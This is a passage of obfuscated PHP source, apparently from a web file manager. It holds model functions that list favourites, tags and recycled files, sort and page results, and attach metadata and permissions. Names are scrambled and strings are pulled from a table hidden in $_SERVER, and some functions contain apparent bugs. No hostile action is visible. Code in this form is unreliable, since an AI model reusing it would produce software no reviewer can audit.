(in_array($Ûâö¹î„, $Èó¤ûÆº)) { continue; } $Ê‰ã¨Ë[] = $Ûâö¹î„; } $ğú‚ÁĞ­ = explode($“†à¬[60], $“†à¬[502]); } foreach ($ğú‚ÁĞ­ as $‹èÉ ™Š) { if (isset($ÆÂ”ø§¯[$‹èÉ ™Š])) { $ÆÂ”ø§¯[$‹èÉ ™Š] = intval($ÆÂ”ø§¯[$‹èÉ ™Š]); } } $ÆÂ”ø§¯[$“†à¬[97]] = $“†à¬[503] . $ÆÂ”ø§¯[$“†à¬[202]] . $“†à¬[504]; $ÆÂ”ø§¯[$“†à¬[43]] = $ÆÂ”ø§¯[$“†à¬[505]] == 1 ? $“†à¬[88] : $“†à¬[241]; $ÆÂ”ø§¯[$“†à¬[199]] = $this->typeName($ÆÂ”ø§¯[$“†à¬[199]]); if ($ÆÂ”ø§¯[$“†à¬[505]] != 1) { $ÆÂ”ø§¯[$“†à¬[177]] = $ÆÂ”ø§¯[$“†à¬[506]]; unset($ÆÂ”ø§¯[$“†à¬[506]]); } $é ¥€“Ñ = $œ¤Æ¹ø«; if (isset($ÆÂ”ø§¯[$“†à¬[507]]) && $ÆÂ”ø§¯[$“†à¬[507]][$“†à¬[508]] == -1) { $é ¥€“Ñ = $Ê‰ã¨Ë; } $ÆÂ”ø§¯ = array_field_key($ÆÂ”ø§¯, $é ¥€“Ñ); return $ÆÂ”ø§¯; } public function listUserFav() { $Ú½ØÀ€ =& $_SERVER[ŒÅŸ‹ä†]; $‰à¡˜Ş‹ = Model($Ú½ØÀ€[509])->listData(); $£±µÍ¼‘ = array_filter_by_field($‰à¡˜Ş‹, $Ú½ØÀ€[43], $Ú½ØÀ€[510]); $£±µÍ¼‘ = array_to_keyvalue($£±µÍ¼‘, $Ú½ØÀ€[12], $Ú½ØÀ€[97]); if ($£±µÍ¼‘) { $Óãç³± = $this->listSource(array($Ú½ØÀ€[511] => array($Ú½ØÀ€[512], $£±µÍ¼‘))); } $Óãç³± = array_to_keyvalue($Óãç³±[$Ú½ØÀ€[455]], $Ú½ØÀ€[202]); foreach ($‰à¡˜Ş‹ as &$…ó¤Ş…Ÿ) { $…ó¤Ş…Ÿ = array($Ú½ØÀ€[513] => $…ó¤Ş…Ÿ[$Ú½ØÀ€[492]], $Ú½ØÀ€[514] => $…ó¤Ş…Ÿ[$Ú½ØÀ€[42]], $Ú½ØÀ€[515] => $…ó¤Ş…Ÿ[$Ú½ØÀ€[97]], $Ú½ØÀ€[516] => $…ó¤Ş…Ÿ[$Ú½ØÀ€[43]], $Ú½ØÀ€[517] => $…ó¤Ş…Ÿ[$Ú½ØÀ€[242]], $Ú½ØÀ€[518] => $…ó¤Ş…Ÿ[$Ú½ØÀ€[98]]); if ($…ó¤Ş…Ÿ[$Ú½ØÀ€[43]] == $Ú½ØÀ€[510] && $Óãç³±[$…ó¤Ş…Ÿ[$Ú½ØÀ€[97]]]) { $…ó¤Ş…Ÿ[$Ú½ØÀ€[100]] = $Óãç³±[$…ó¤Ş…Ÿ[$Ú½ØÀ€[97]]]; } } unset($…ó¤Ş…Ÿ); return $‰à¡˜Ş‹; } public function listUserTag($ˆëœ¼÷) { $€ëÔ†± =& $_SERVER[ŒÅŸ‹ä†]; if ($ˆëœ¼÷ && !is_array($ˆëœ¼÷)) { $ˆëœ¼÷ = array($ˆëœ¼÷); } $÷ÃÛã§› = Model($€ëÔ†±[519])->listData(); $ùé“µ…Ì = array(); $«äŞÅñÂ = array(); foreach ($÷ÃÛã§› as $…Õ¿äââ) { $ÒçİôÒ = $…Õ¿äââ[$€ëÔ†±[97]]; if (!$ÒçİôÒ) { continue; } if (!isset($«äŞÅñÂ[$ÒçİôÒ])) { $«äŞÅñÂ[$ÒçİôÒ] = array(); } $«äŞÅñÂ[$ÒçİôÒ][] = $…Õ¿äââ[$€ëÔ†±[520]]; $ùé“µ…Ì[$…Õ¿äââ[$€ëÔ†±[97]]] = $…Õ¿äââ; } $º¯÷¬ıË = array(); $«†¦öºØ = array(); $¬Ò¢¼¨³ = array(); foreach ($«äŞÅñÂ as $İÄ¦²Ú => $Û‡úµÁğ) { $ê—†Ø‚ = !0; if (!$ˆëœ¼÷) { $º¯÷¬ıË[] = $İÄ¦²Ú; continue; } foreach ($ˆëœ¼÷ as $ÁÕğ›ã) { if (!in_array($ÁÕğ›ã, $Û‡úµÁğ)) { $ê—†Ø‚ = !1; break; } } if (!$ê—†Ø‚) { continue; } if (!is_numeric($İÄ¦²Ú)) { $ıšÏ¯Şè = $ùé“µ…Ì[$İÄ¦²Ú]; $´öÕÔ‹î = array($€ëÔ†±[42] => $ıšÏ¯Şè[$€ëÔ†±[42]], $€ëÔ†±[97] => $ıšÏ¯Şè[$€ëÔ†±[97]], $€ëÔ†±[43] => $ıšÏ¯Şè[$€ëÔ†±[43]], $€ëÔ†±[100] => array($€ëÔ†±[521] => 1), $€ëÔ†±[243] => !0); if ($ıšÏ¯Şè[$€ëÔ†±[43]] == $€ëÔ†±[241]) { $¬Ò¢¼¨³[] = $´öÕÔ‹î; } if ($ıšÏ¯Şè[$€ëÔ†±[43]] == $€ëÔ†±[88]) { $«†¦öºØ[] = $´öÕÔ‹î; } continue; } $º¯÷¬ıË[] = $İÄ¦²Ú; } if ($º¯÷¬ıË) { $Óâ‘â´Ì = $this->listSource(array($€ëÔ†±[511] => array($€ëÔ†±[512], $º¯÷¬ıË))); } $Óâ‘â´Ì = $Óâ‘â´Ì ? $Óâ‘â´Ì : array($€ëÔ†±[95] => array(), $€ëÔ†±[96] => array()); $Óâ‘â´Ì[$€ëÔ†±[95]] = array_merge($Óâ‘â´Ì[$€ëÔ†±[95]], $«†¦öºØ); $Óâ‘â´Ì[$€ëÔ†±[96]] = array_merge($Óâ‘â´Ì[$€ëÔ†±[96]], $¬Ò¢¼¨³); if (isset($Óâ‘â´Ì[$€ëÔ†±[452]]) && count($º¯÷¬ıË) == $Óâ‘â´Ì[$€ëÔ†±[452]][$€ëÔ†±[453]]) { return $Óâ‘â´Ì; } $ãŠÀÜë = array(); $éÀñáŸ© = array_to_keyvalue($Óâ‘â´Ì[$€ëÔ†±[95]], $€ëÔ†±[12], $€ëÔ†±[202]); $ı¤ğşà = array_to_keyvalue($Óâ‘â´Ì[$€ëÔ†±[96]], $€ëÔ†±[12], $€ëÔ†±[202]); $Éƒ¦Ì¼û = array_merge($ı¤ğşà, $éÀñáŸ©); foreach ($º¯÷¬ıË as $ÒçİôÒ) { if (!in_array($ÒçİôÒ, $Éƒ¦Ì¼û)) { $ãŠÀÜë[] = $ÒçİôÒ; } } if ($ãŠÀÜë) { Model($€ëÔ†±[522])->removeBySource($ãŠÀÜë); } return $Óâ‘â´Ì; } public function listUserRecycle() { $‚µøó·Š =& $_SERVER[ŒÅŸ‹ä†]; $…§ì”øï = Model($‚µøó·Š[523])->listData(); if (!$…§ì”øï) { return array(); } $Ó‹˜³Òˆ = array($‚µøó·Š[511] => array($‚µøó·Š[512], $…§ì”øï), $‚µøó·Š[524] => 1); return $this->listSource($Ó‹˜³Òˆ); } public function listSource($üôê×«, $É¢Ô×Ô§ = 3000, $Å¨õøŞî = false) { $×Ø™ ‘ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($üôê×«[$×Ø™ ‘[525]])) { $üôê×«[$×Ø™ ‘[525]] = 0; } if (isset($üôê×«[$×Ø™ ‘[201]]) && $üôê×«[$×Ø™ ‘[201]] == $×Ø™ ‘[239]) { $üôê×«[$×Ø™ ‘[506]] = array($×Ø™ ‘[473], $×Ø™ ‘[12]); } if (isset($üôê×«[$×Ø™ ‘[201]])) { $üôê×«[$×Ø™ ‘[201]] = intval($üôê×«[$×Ø™ ‘[201]]); } $ ê¦¡³¸ = $×Ø™ ‘[526]; $ùÉ¡é‚ = $this->field($ ê¦¡³¸)->_makeOrder()->where($üôê×«)->selectPage($É¢Ô×Ô§); $this->_listPageCheck($ùÉ¡é‚, $ ê¦¡³¸, $üôê×«); $this->_listDataApply($ùÉ¡é‚[$×Ø™ ‘[455]], $Å¨õøŞî); $this->_listMake($ùÉ¡é‚); return $ùÉ¡é‚; } private function _listPageCheck(&$éÒìêğ, $äÅĞ¥çğ, $ÆØ€»çÂ) { $Ôø¦ÒÉ­ =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($éÒìêğ[$Ôø¦ÒÉ­[452]])) { return; } $××äÏÓª = $éÒìêğ[$Ôø¦ÒÉ­[452]]; if ($××äÏÓª[$Ôø¦ÒÉ­[454]] <= 1) { return; } if ($××äÏÓª[$Ôø¦ÒÉ­[453]] >= 100000) { return; } if (Model($Ôø¦ÒÉ­[527])->get($Ôø¦ÒÉ­[528]) != $Ôø¦ÒÉ­[529]) { return; } $äÅĞ¥çğ = str_replace(array($Ôø¦ÒÉ­[63], $Ôø¦ÒÉ­[427], $Ôø¦ÒÉ­[18]), $Ôø¦ÒÉ­[12], $äÅĞ¥çğ); $äÅĞ¥çğ = $Ôø¦ÒÉ­[530] . str_replace($Ôø¦ÒÉ­[60], $Ôø¦ÒÉ­[531], $äÅĞ¥çğ) . $Ôø¦ÒÉ­[532]; $­—à–Ôä = $Ôø¦ÒÉ­[533]; $­—à–Ôä = $­—à–Ôä . $Ôø¦ÒÉ­[534]; $­®²ú³± = $××äÏÓª[$Ôø¦ÒÉ­[449]] * ($××äÏÓª[$Ôø¦ÒÉ­[438]] - 1) . $Ôø¦ÒÉ­[60] . $××äÏÓª[$Ôø¦ÒÉ­[449]]; $Ò˜ÂñáÃ = $this->_makeOrder(!0); $¸óÕè = $Ôø¦ÒÉ­[530] . str_replace($Ôø¦ÒÉ­[60], $Ôø¦ÒÉ­[531], $Ò˜ÂñáÃ[0]); if (strpos($¸óÕè, $Ôø¦ÒÉ­[535])) { $¸óÕè = str_replace($Ôø¦ÒÉ­[535], $Ôø¦ÒÉ­[536], $¸óÕè); } else { $¸óÕè .= $Ôø¦ÒÉ­[537] . $Ò˜ÂñáÃ[1]; } $·Â…¹ô = array(); foreach ($ÆØ€»çÂ as $¸µƒ±Ûº => $ä‰–ÜÌ˜) { $·Â…¹ô[$Ôø¦ÒÉ­[530] . $¸µƒ±Ûº] = $ä‰–ÜÌ˜; } $this->alias($Ôø¦ÒÉ­[538])->field($äÅĞ¥çğ)->limit($­®²ú³±)->order($¸óÕè); $…‹‰ı¨ = $this->join($­—à–Ôä)->where($·Â…¹ô)->select(); if ($…‹‰ı¨) { $éÒìêğ[$Ôø¦ÒÉ­[455]] = $…‹‰ı¨; } } protected function _makeOrder($ü÷Ê³½µ = false) { $…î‚ÜÃú =& $_SERVER[ŒÅŸ‹ä†]; $Ü†ÄÔµ = Model($…î‚ÜÃú[539])->get($…î‚ÜÃú[540]); $ûõĞÃÒ² = Model($…î‚ÜÃú[539])->get($…î‚ÜÃú[541]); $ÓŠªæÎ = array($…î‚ÜÃú[542] => $…î‚ÜÃú[543], $…î‚ÜÃú[544] => $…î‚ÜÃú[545]); $œçØÛ´Ü = array($…î‚ÜÃú[42] => $…î‚ÜÃú[42], $…î‚ÜÃú[89] => $…î‚ÜÃú[89], $…î‚ÜÃú[177] => $…î‚ÜÃú[506], $…î‚ÜÃú[546] => $…î‚ÜÃú[546], $…î‚ÜÃú[547] => $…î‚ÜÃú[548], $…î‚ÜÃú[242] => $…î‚ÜÃú[242], $…î‚ÜÃú[98] => $…î‚ÜÃú[98]); $Ğ¢„¢Â¤ = Input::get($…î‚ÜÃú[549], $…î‚ÜÃú[7], $Ü†ÄÔµ, array_keys($œçØÛ´Ü)); $‡ğ€©Ô = Input::get($…î‚ÜÃú[550], $…î‚ÜÃú[7], $ûõĞÃÒ², array_keys($ÓŠªæÎ)); if (!in_array($Ğ¢„¢Â¤, array_keys($œçØÛ´Ü))) { $Ğ¢„¢Â¤ = $…î‚ÜÃú[42]; } if (!in_array($‡ğ€©Ô, array_keys($ÓŠªæÎ))) { $Ğ¢„¢Â¤ = $…î‚ÜÃú[542]; } if ($Ğ¢„¢Â¤ == $…î‚ÜÃú[42]) { } $‹€Èİã¯ = $…î‚ÜÃú[551] . $œçØÛ´Ü[$Ğ¢„¢Â¤] . $…î‚ÜÃú[63] . $ÓŠªæÎ[$‡ğ€©Ô]; $‹€Èİã¯ = rtrim(trim($‹€Èİã¯), $…î‚ÜÃú[60]); if ($ü÷Ê³½µ) { return array($‹€Èİã¯, $ÓŠªæÎ[$‡ğ€©Ô]); } return $this->order($‹€Èİã¯); } protected function _listDataApplyItem($£®‡´·¤, $íùè…Œ¡ = false) { $–÷î„ñŞ = array($£®‡´·¤); $this->_listDataApply($–÷î„ñŞ, $íùè…Œ¡); return $–÷î„ñŞ[0]; } protected function _listDataApply(&$„¾¿ñ£Ô, $¸î•ââù = false) { $‚Ù£Ÿ‡ =& $_SERVER[ŒÅŸ‹ä†]; if (!$„¾¿ñ£Ô) { $„¾¿ñ£Ô = array(); return; } $³ñ¿ÁØ¶ = array_to_keyvalue($„¾¿ñ£Ô, $‚Ù£Ÿ‡[12], $‚Ù£Ÿ‡[202]); $³ñ¿ÁØ¶ = array_unique($³ñ¿ÁØ¶); $³ñ¿ÁØ¶ = array_to_int($³ñ¿ÁØ¶); $this->_listSourceCache($„¾¿ñ£Ô); if (!$¸î•ââù) { $this->_listAppendMeta($„¾¿ñ£Ô, $³ñ¿ÁØ¶); $this->_listAppendFileMeta($„¾¿ñ£Ô, $³ñ¿ÁØ¶); $this->_listAppendChildren($„¾¿ñ£Ô, $³ñ¿ÁØ¶); } $this->_listAppendPath($„¾¿ñ£Ô); $this->_listAppendAuth($„¾¿ñ£Ô); $this->_listAppendSourceInfo($„¾¿ñ£Ô, $³ñ¿ÁØ¶); $this->_listAppendUser($„¾¿ñ£Ô); $this->_listFilterInfo($„¾¿ñ£Ô, $¸î•ââù); $this->_listAppendAuthSecret($„¾¿ñ£Ô); } protected function _listSourceCache($ºª‘¼ß) { $‘æ¥šš =& $_SERVER[ŒÅŸ‹ä†]; foreach ($ºª‘¼ß as $¦Æ¯÷Åš) { self::$cacheSourceInfo[$‘æ¥šš[552] . $¦Æ¯÷Åš[$‘æ¥šš[202]]] = $¦Æ¯÷Åš; } } protected function _listFilterInfo(&$ÍŞà¦º, $•ü¸‚Ü = false) { $şÏ¦ªº =& $_SERVER[ŒÅŸ‹ä†]; foreach ($ÍŞà¦º as &$ØÔ¯òæÍ) { $ØÔ¯òæÍ = $this->pathInfoFilter($ØÔ¯òæÍ); self::$cachePathInfo[$şÏ¦ªº[553] . intval($•ü¸‚Ü) . $şÏ¦ªº[482] . $ØÔ¯òæÍ[$şÏ¦ªº[202]]] = $ØÔ¯òæÍ; } unset($ØÔ¯òæÍ); } protected function _listMake(&$¡ĞàŸ¦½) { $Úğ¡ÙŠ =& $_SERVER[ŒÅŸ‹ä†]; $¡ĞàŸ¦½[$Úğ¡ÙŠ[95]] = array(); $¡ĞàŸ¦½[$Úğ¡ÙŠ[96]] = array(); foreach ($¡ĞàŸ¦½[$Úğ¡ÙŠ[455]] as $–»Ê‰ˆÕ) { $À¶®€ = $–»Ê‰ˆÕ[$Úğ¡ÙŠ[505]] == 1 ? $Úğ¡ÙŠ[95] : $Úğ¡ÙŠ[96]; $¡ĞàŸ¦½[$À¶®€][] = $–»Ê‰ˆÕ; } unset($¡ĞàŸ¦½[$Úğ¡ÙŠ[455]]); } protected function _listAppendMeta(&$àëÍ·Ø, $êÚ·åÄ) { $­ÕÇ°Üß =& $_SERVER[ŒÅŸ‹ä†]; $Úú½÷Òó = array($­ÕÇ°Üß[511] => array($­ÕÇ°Üß[512], $êÚ·åÄ)); $ºĞÓ¸“å = Model($­ÕÇ°Üß[554])->field($­ÕÇ°Üß[555])->where($Úú½÷Òó)->select(); if (!$ºĞÓ¸“å) { return; } $Á“Èõóø = array($­ÕÇ°Üß[556], $­ÕÇ°Üß[557], $­ÕÇ°Üß[536]); $§®¯ºé = array(); foreach ($ºĞÓ¸“å as $íèú‰·‘) { if (!isset($§®¯ºé[$íèú‰·‘[$­ÕÇ°Üß[202]]])) { $§®¯ºé[$íèú‰·‘[$­ÕÇ°Üß[202]]] = array(); } if (in_array($íèú‰·‘[$­ÕÇ°Üß[105]], $Á“Èõóø)) { continue; } if ($íèú‰·‘[$­ÕÇ°Üß[105]] == $­ÕÇ°Üß[558]) { $íèú‰·‘[$­ÕÇ°Üß[460]] = $­ÕÇ°Üß[559]; } $§®¯ºé[$íèú‰·‘[$­ÕÇ°Üß[202]]][$íèú‰·‘[$­ÕÇ°Üß[105]]] = $íèú‰·‘[$­ÕÇ°Üß[460]]; } foreach ($àëÍ·Ø as &$ç¥ˆ¢–ê) { $ç¥ˆ¢–ê[$­ÕÇ°Üß[560]] = !1; if (isset($§®¯ºé[$ç¥ˆ¢–ê[$­ÕÇ°Üß[202]]])) { $ç¥ˆ¢–ê[$­ÕÇ°Üß[560]] = $§®¯ºé[$ç¥ˆ¢–ê[$­ÕÇ°Üß[202]]]; } if ($this->fileIsLock($ç¥ˆ¢–ê) && $ç¥ˆ¢–ê[$­ÕÇ°Üß[507]]) { $¹™ŞğÑë = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ç¥ˆ¢–ê[$­ÕÇ°Üß[507]][$­ÕÇ°Üß[508]] = AuthModel::authDisable($ç¥ˆ¢–ê[$­ÕÇ°Üß[507]][$­ÕÇ°Üß[508]], $¹™ŞğÑë); $ç¥ˆ¢–ê[$­ÕÇ°Üß[507]][$­ÕÇ°Üß[561]][$­ÕÇ°Üß[507]] = $ç¥ˆ¢–ê[$­ÕÇ°Üß[507]][$­ÕÇ°Üß[508]]; } } unset($ç¥ˆ¢–ê); } protected function _listAppendFileMeta(&$ÙÈˆÖ×, $¶µ¸ãà) { $Şä«…ˆÖ =& $_SERVER[ŒÅŸ‹ä†]; $ÇŸòšÂÎ = array_to_keyvalue($ÙÈˆÖ×, $Şä«…ˆÖ[12], $Şä«…ˆÖ[562]); $ÇŸòšÂÎ = array_filter(array_unique($ÇŸòšÂÎ)); $ÇŸòšÂÎ = array_to_int($ÇŸòšÂÎ); if (!$ÇŸòšÂÎ) { return; } $ïí–ïÇÒ = array($Şä«…ˆÖ[563] => array($Şä«…ˆÖ[512], $ÇŸòšÂÎ)); $¯‚ªáõ¡ = $Şä«…ˆÖ[564]; $Ñæòô‡ì = Model($Şä«…ˆÖ[565])->field($¯‚ªáõ¡)->where($ïí–ïÇÒ)->select(); $Ñæòô‡ì = array_to_keyvalue($Ñæòô‡ì, $Şä«…ˆÖ[562]); $ƒş½‡Öî = Model($Şä«…ˆÖ[566])->field($Şä«…ˆÖ[567])->where($ïí–ïÇÒ)->select(); $ƒş½‡Öî = $ƒş½‡Öî ? $ƒş½‡Öî : array(); $£şŒŞ = array(); foreach ($ƒş½‡Öî as $±ãêõ) { if (!isset($£şŒŞ[$±ãêõ[$Şä«…ˆÖ[562]]])) { $£şŒŞ[$±ãêõ[$Şä«…ˆÖ[562]]] = array(); } $£şŒŞ[$±ãêõ[$Şä«…ˆÖ[562]]][$±ãêõ[$Şä«…ˆÖ[105]]] = $±ãêõ[$Şä«…ˆÖ[460]]; } foreach ($ÙÈˆÖ× as &$Ñ³¦ÄÂÔ) { $Ğñ´¡Äò = $Ñ³¦ÄÂÔ[$Şä«…ˆÖ[562]]; if (!$Ğñ´¡Äò || !is_array($Ñæòô‡ì[$Ğñ´¡Äò])) { continue; } $ßâê•Ãä = $Ñæòô‡ì[$Ğñ´¡Äò]; $ßâê•Ãä[$Şä«…ˆÖ[89]] = $Ñ³¦ÄÂÔ[$Şä«…ˆÖ[89]]; $ßâê•Ãä[$Şä«…ˆÖ[42]] = $Ñ³¦ÄÂÔ[$Şä«…ˆÖ[42]]; if (!$ßâê•Ãä[$Şä«…ˆÖ[568]]) { Model($Şä«…ˆÖ[565])->fileMd5Check($ßâê•Ãä); } if (!isset(self::$cacheFileInfo[$Şä«…ˆÖ[569] . $Ğñ´¡Äò])) { self::$cacheFileInfo[$Şä«…ˆÖ[569] . $Ğñ´¡Äò] = array_merge(array(), $ßâê•Ãä); } unset($Ñæòô‡ì[$Ğñ´¡Äò][$Şä«…ˆÖ[97]]); $®¾ìÉ£î = isset($£şŒŞ[$Ğñ´¡Äò]) && is_array($£şŒŞ[$Ğñ´¡Äò]) ? $£şŒŞ[$Ğñ´¡Äò] : array(); $Ñ³¦ÄÂÔ[$Şä«…ˆÖ[178]] = array_merge($®¾ìÉ£î, $Ñæòô‡ì[$Ğñ´¡Äò]); if (isset($Ñ³¦ÄÂÔ[$Şä«…ˆÖ[178]][$Şä«…ˆÖ[193]])) { $Ñ³¦ÄÂÔ[$Şä«…ˆÖ[193]] = json_decode($Ñ³¦ÄÂÔ[$Şä«…ˆÖ[178]][$Şä«…ˆÖ[193]], !0); unset($Ñ³¦ÄÂÔ[$Şä«…ˆÖ[178]][$Şä«…ˆÖ[193]]); } } unset($Ñ³¦ÄÂÔ); } protected function _listAppendSourceInfo(&$Š¯åı—å, $ı½Œ·­) { $ü‚»¿õ =& $_SERVER[ŒÅŸ‹ä†]; $…¨¨œÍ = Model($ü‚»¿õ[570])->listData(); $‘»¥¥Í… = Model($ü‚»¿õ[519])->listData(); $˜ŸûÑğá = Model($ü‚»¿õ[509])->listData(); $í‹ĞÑå‚ = Model($ü‚»¿õ[571])->listSimple(); $¶„ïé¿º = array_to_keyvalue($…¨¨œÍ, $ü‚»¿õ[492]); $¯êÂé = array_to_keyvalue_group($‘»¥¥Í…, $ü‚»¿õ[97], $ü‚»¿õ[520]); $¹Üº§òó = array_to_keyvalue($˜ŸûÑğá, $ü‚»¿õ[97]); $“ú€Ç¾” = array_to_keyvalue_group($í‹ĞÑå‚, $ü‚»¿õ[202]); foreach ($Š¯åı—å as &$·¼Ø‡¿œ) { $·¼Ø‡¿œ[$ü‚»¿õ[100]] = array($ü‚»¿õ[572] => 0, $ü‚»¿õ[573] => 0, $ü‚»¿õ[574] => 0); if (isset($¹Üº§òó[$·¼Ø‡¿œ[$ü‚»¿õ[202]]])) { $·¼Ø‡¿œ[$ü‚»¿õ[100]][$ü‚»¿õ[575]] = 1; $·¼Ø‡¿œ[$ü‚»¿õ[100]][$ü‚»¿õ[576]] = $¹Üº§òó[$·¼Ø‡¿œ[$ü‚»¿õ[202]]][$ü‚»¿õ[42]]; } if ($¯êÂé && $¶„ïé¿º && isset($¯êÂé[$·¼Ø‡¿œ[$ü‚»¿õ[202]]])) { $·¼Ø‡¿œ[$ü‚»¿õ[100]][$ü‚»¿õ[577]] = array(); foreach ($¯êÂé[$·¼Ø‡¿œ[$ü‚»¿õ[202]]] as $°ø§Œãó) { $–ÚÇëğÂ = $¶„ïé¿º[$°ø§Œãó]; $·¼Ø‡¿œ[$ü‚»¿õ[100]][$ü‚»¿õ[577]][] = array($ü‚»¿õ[578] => $–ÚÇëğÂ[$ü‚»¿õ[492]], $ü‚»¿õ[514] => $–ÚÇëğÂ[$ü‚»¿õ[42]], $ü‚»¿õ[579] => $–ÚÇëğÂ[$ü‚»¿õ[580]]); } } if ($“ú€Ç¾” && isset($“ú€Ç¾”[$·¼Ø‡¿œ[$ü‚»¿õ[202]]])) { $·¼Ø‡¿œ[$ü‚»¿õ[100]][$ü‚»¿õ[581]] = array(); foreach ($“ú€Ç¾”[$·¼Ø‡¿œ[$ü‚»¿õ[202]]] as $£‹Ï‘ÅÈ) { $·¼Ø‡¿œ[$ü‚»¿õ[100]][$ü‚»¿õ[581]] = $this->shareFilterShow($£‹Ï‘ÅÈ); } } } unset($·¼Ø‡¿œ); return $Š¯åı—å; } protected function shareFilterShow($‡ƒúââ) { $°‹ÑèĞ¶ =& $_SERVER[ŒÅŸ‹ä†]; if (!$‡ƒúââ) { return $‡ƒúââ; } $ŒøËˆ¿¬ = $°‹ÑèĞ¶[582]; if ($‡ƒúââ[$°‹ÑèĞ¶[583]] == $°‹ÑèĞ¶[101]) { $ŒøËˆ¿¬ .= $°‹ÑèĞ¶[584]; } if (is_array($‡ƒúââ[$°‹ÑèĞ¶[585]]) && is_array($‡ƒúââ[$°‹ÑèĞ¶[585]][$°‹ÑèĞ¶[586]])) { $‡ƒúââ[$°‹ÑèĞ¶[585]][$°‹ÑèĞ¶[586]] = $°‹ÑèĞ¶[587]; } if (!$â›åšÕ[$°‹ÑèĞ¶[588]] && $â›åšÕ[$°‹ÑèĞ¶[202]] != $°‹ÑèĞ¶[239]) { $â›åšÕ[$°‹ÑèĞ¶[588]] = KodIO::make($â›åšÕ[$°‹ÑèĞ¶[202]]); } $‡ƒúââ = array_field_key($‡ƒúââ, explode($°‹ÑèĞ¶[60], $ŒøËˆ¿¬)); return $‡ƒúââ; } protected function _listAppendChildren(&$áÆÂ¥‡¢, $˜ºÉØõÁ) { $¿¶ÃüĞ© =& $_SERVER[ŒÅŸ‹ä†]; $é®ŞÜÉ° = array(); $­³Íõ´× = array($¿¶ÃüĞ©[250] => 0, $¿¶ÃüĞ©[251] => 0); foreach ($áÆÂ¥‡¢ as &$şŞÓ­éü) { if (!$şŞÓ­éü[$¿¶ÃüĞ©[505]]) { continue; } $é®ŞÜÉ°[] = intval($şŞÓ­éü[$¿¶ÃüĞ©[202]]); } unset($şŞÓ­éü); if (!$é®ŞÜÉ°) { return; } $Äè¾¸Îú = array($¿¶ÃüĞ©[201] => array($¿¶ÃüĞ©[7], $é®ŞÜÉ°), $¿¶ÃüĞ©[525] => 0); $«×¬˜”î = array($¿¶ÃüĞ©[201], $¿¶ÃüĞ©[505], $¿¶ÃüĞ©[589] => $¿¶ÃüĞ©[590]); $ù«šØ›ï = $this->field($«×¬˜”î)->where($Äè¾¸Îú)->group($¿¶ÃüĞ©[591])->select(); $°ÎµØ¤” = array(); foreach ($ù«šØ›ï as $À‡©¼ªë) { $ØÂèÖ” = $À‡©¼ªë[$¿¶ÃüĞ©[201]]; $ğÄ¹©Ãœ = $À‡©¼ªë[$¿¶ÃüĞ©[505]] == $¿¶ÃüĞ©[101] ? $¿¶ÃüĞ©[251] : $¿¶ÃüĞ©[250]; if (!isset($°ÎµØ¤”[$ØÂèÖ”])) { $°ÎµØ¤”[$ØÂèÖ”] = array($¿¶ÃüĞ©[250] => 0, $¿¶ÃüĞ©[251] => 0); } $°ÎµØ¤”[$ØÂèÖ”][$ğÄ¹©Ãœ] += $À‡©¼ªë[$¿¶ÃüĞ©[590]]; } foreach ($áÆÂ¥‡¢ as &$şŞÓ­éü) { if (!$şŞÓ­éü[$¿¶ÃüĞ©[505]]) { continue; } $®±­© = is_array($°ÎµØ¤”[$şŞÓ­éü[$¿¶ÃüĞ©[202]]]) ? $°ÎµØ¤”[$şŞÓ­éü[$¿¶ÃüĞ©[202]]] : $­³Íõ´×; $şŞÓ­éü[$¿¶ÃüĞ©[251]] = $®±­©[$¿¶ÃüĞ©[251]]; $şŞÓ­éü[$¿¶ÃüĞ©[250]] = $®±­©[$¿¶ÃüĞ©[250]]; unset($şŞÓ­éü[$¿¶ÃüĞ©[506]]); } unset($şŞÓ­éü); } protected function _listAppendAuth(&$ÑÏŸÑ¢…) { $öŠ¨óèö =& $_SERVER[ŒÅŸ‹ä†]; $‰™¤ˆÊ” = array(); foreach ($ÑÏŸÑ¢… as $å÷ã”„) { if ($å÷ã”„[$öŠ¨óèö[199]] == self::TYPE_GROUP) { $‰™¤ˆÊ”[] = intval($å÷ã”„[$öŠ¨óèö[202]]); } } if (!$‰™¤ˆÊ”) { return; } $ßò…‚ú = array_to_keyvalue($ÑÏŸÑ¢…, $öŠ¨óèö[202]); $şÒ”½Ø¤ = Model($öŠ¨óèö[592])->getSourceList($‰™¤ˆÊ”, $ßò…‚ú); $İ–¿å¡ª = KodUser::isRoot(); foreach ($ÑÏŸÑ¢… as $Ó§¹©®Í => &$å÷ã”„) { $å÷ã”„[$öŠ¨óèö[507]] = $şÒ”½Ø¤[$å÷ã”„[$öŠ¨óèö[202]]]; if (!$å÷ã”„[$öŠ¨óèö[507]] && $å÷ã”„[$öŠ¨óèö[199]] == self::TYPE_GROUP) { $å÷ã”„[$öŠ¨óèö[507]] = Action($öŠ¨óèö[593])->pathGroupAuthMake($å÷ã”„[$öŠ¨óèö[594]]); if (!$å÷ã”„[$öŠ¨óèö[507]] && !$İ–¿å¡ª) { $å÷ã”„[$öŠ¨óèö[244]] = !1; $å÷ã”„[$öŠ¨óèö[243]] = !1; } } if ($å÷ã”„[$öŠ¨óèö[507]]) { $å÷ã”„[$öŠ¨óèö[244]] = AuthModel::authCheckEdit($å÷ã”„[$öŠ¨óèö[507]][$öŠ¨óèö[508]]); $å÷ã”„[$öŠ¨óèö[243]] = AuthModel::authCheckView($å÷ã”„[$öŠ¨óèö[507]][$öŠ¨óèö[508]]); } $this->groupPathDisplay($å÷ã”„); } unset($å÷ã”„); } public function _listAppendAuthSecret(&$µ·«Ä’¡) { $¾×©õüü =& $_SERVER[ŒÅŸ‹ä†]; if (Model($¾×©õüü[527])->get($¾×©õüü[595]) != $¾×©õüü[101]) { return; } static $ğ¡ıÖÛâ = false; if (!$ğ¡ıÖÛâ) { $äªêÏÅ¤ = Model($¾×©õüü[596]); $÷ı¿Ğßø = Model($¾×©õüü[597]); $ğ¡ıÖÛâ = $÷ı¿Ğßø->listData(); $ğ¡ıÖÛâ = array_to_keyvalue($ğ¡ıÖÛâ, $¾×©õüü[202]); $ú¿¯ˆó— = json_decode(Model($¾×©õüü[527])->get($¾×©õüü[598]), !0); $ú¿¯ˆó— = array_to_keyvalue($ú¿¯ˆó—, $¾×©õüü[492]); foreach ($ğ¡ıÖÛâ as $°ëœÎÇù => $Ó•Å¹¸‰) { $ı¸¨Ê = $ú¿¯ˆó—[$Ó•Å¹¸‰[$¾×©õüü[599]]]; if 